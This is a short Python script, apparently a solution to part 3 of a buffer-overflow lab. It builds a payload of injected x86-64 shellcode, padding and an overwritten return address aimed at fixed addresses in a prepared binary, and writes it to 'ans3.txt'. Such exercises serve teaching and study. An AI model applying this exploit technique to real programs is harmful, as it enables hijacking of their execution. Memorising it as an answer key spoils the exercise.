import struct

def main():
    # 构造 Shellcode 机器码
    shellcode = (
        b'\x48\xc7\xc7\x72\x00\x00\x00'  
        b'\x48\xc7\xc0\x16\x12\x40\x00'  
        b'\xff\xd0'                      
    )
    
    # 计算 Padding
    padding_len = 40 - len(shellcode)
    padding = b'A' * padding_len

    # 构造 Return Address
    jmp_xs_addr = struct.pack('<Q', 0x401334)

    # 组合 Payload
    payload = shellcode + padding + jmp_xs_addr

    with open("ans3.txt", "wb") as f:
        f.write(payload)

    print(f"Payload 已生成到 ans3.txt，总长度: {len(payload)} 字节")

if __name__ == "__main__":
    main()